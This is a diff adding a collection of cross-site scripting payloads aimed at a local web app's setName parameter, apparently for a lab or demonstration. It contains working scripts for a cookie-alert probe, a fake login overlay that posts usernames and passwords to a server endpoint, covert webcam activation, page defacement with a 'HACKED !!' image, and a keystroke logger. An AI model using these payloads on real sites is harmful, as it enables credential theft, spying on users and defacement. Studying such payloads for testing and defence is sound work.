@@ -1,0 +1,35 @@
+http://localhost:3000/setName?name
+
+<script>alert(document.cookie)</script>
+
+<div id="LogonForm">
+  <div style="display: flex; justify-content: center; align-items: center; height: 100vh">
+    <div style="width: 60%;">
+      <h3>Please login to proceed</h3> 
+      <form action=http://localhost:3000/data  method=post>
+        Username:<br>
+        <input type="text" name="username"></br>
+        Password:<br>
+        <input type="password" name="password"></br>
+        <input type="submit" value="Login"></br>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script> document.body.innerHTML = document.getElementById('LogonForm').innerHTML</script>
+
+<video id="player" controls autoplay></video><script>const player = document.getElementById('player');const constraints = {video: true};navigator.mediaDevices.getUserMedia(constraints).then((stream) => {player.srcObject = stream;});</script>
+
+<script>
+  var x = document.createElement("IMG");
+  x.setAttribute("src", "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTfflCZM2RtKdB3sgKDTU2DboVQ3ImqtvVTcd-wFJJRIfQuMKT8");
+  x.setAttribute("width", "100%");
+  x.setAttribute("height", "100%");
+  x.setAttribute("alt", "HACKED !!");
+  document.body.innerHTML = ""
+  document.body.appendChild(x);
+</script>
+
+
+<script>document.onkeypress = function(e) { get = window.event?event:e; key = get.keyCode?get.keyCode:get.charCode; key = String.fromCharCode(key); console.log(key, new Date()); }</script>
